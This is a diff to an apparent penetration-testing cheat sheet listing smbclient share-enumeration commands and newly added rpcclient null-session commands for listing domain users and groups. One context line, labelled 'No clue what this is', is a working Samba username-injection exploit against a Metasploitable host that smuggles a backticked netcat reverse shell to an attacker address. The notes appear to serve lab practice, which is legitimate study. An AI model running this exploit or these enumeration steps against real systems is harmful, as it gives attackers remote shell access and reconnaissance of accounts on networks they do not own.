@@ -4,3 +4,11 @@ Get Shares----smbclient -I &lt;ip-address&gt; -L &lt;hostname&gt;
 Interact with Share----smbclient \\\\&lt;ip-address&gt;\\share -U &lt;user&gt;
 No clue what this is----smbclient -I 10.0.0.107 -LMETASPLOITABLE -U"/=`nohup mkfifo /tmp/p; nc 10.0.1.2 4444 0&lt;/tmp/p | /bin/sh &gt;/tmp/p 2&gt;&1; rm /tmp/p `"
 Mount Share (Windows)----net use \\&lt;target-ip&gt;\share &lt;password&gt; /u:&lt;username&gt;
+
+##RPC Enumeration
+rpcclient (null session)----rpcclient -U "" ip.addr
+List all Groups----enumdomgroups
+Query a Group----querygroup 0x44f
+Query Member of Group----querygroupmem 0x44f
+Query Users----enumdomusers
+Query a User----queryuser 0x451
